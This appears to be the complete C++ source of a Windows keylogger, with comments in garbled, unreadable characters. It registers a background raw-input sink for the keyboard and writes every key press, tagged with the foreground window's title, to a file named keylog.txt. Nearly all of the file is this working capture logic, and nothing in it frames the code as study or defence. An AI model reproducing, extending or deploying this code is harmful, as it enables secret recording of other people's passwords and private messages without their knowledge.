#include "RawInputTest.h"
#include "VirtualKeyToAscii.h"


void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}


// ע��ԭʼ�����豸
BOOL Init(HWND hWnd)
{
	// ���� RAWINPUTDEVICE �ṹ����Ϣ
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;
	// ע��ԭʼ�����豸
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		ShowError("RegisterRawInputDevices");
		return FALSE;
	}

	return TRUE;
}


// ��ȡԭʼ��������
BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// ��ȡԭʼ�������ݵĴ�С
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> ��ͨ����    WM_SYSKEYDOWN --> ϵͳ����(ָ����ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// ��¼����
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}


// ���水����Ϣ
void SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE *fp = NULL;
	// ��ȡ���㴰��
	HWND hForegroundWnd = ::GetForegroundWindow();
	// ��ȡ���㴰�ڱ���
	::GetWindowText(hForegroundWnd, szTitle, 256);
	// ���������ת���ɶ�Ӧ��ASCII
	::lstrcpy(szKey, GetKeyName(usVKey));
	// ���찴����¼��Ϣ�ַ���
	::wsprintf(szText, "[%s] %s\r\n", szTitle, szKey);
	// ���ļ�д�밴����¼����
	::fopen_s(&fp, "keylog.txt", "a+");
	if (NULL == fp)
	{
		ShowError("fopen_s");
		return;
	}
	::fwrite(szText, (1 + ::lstrlen(szText)), 1, fp);
	::fclose(fp);
}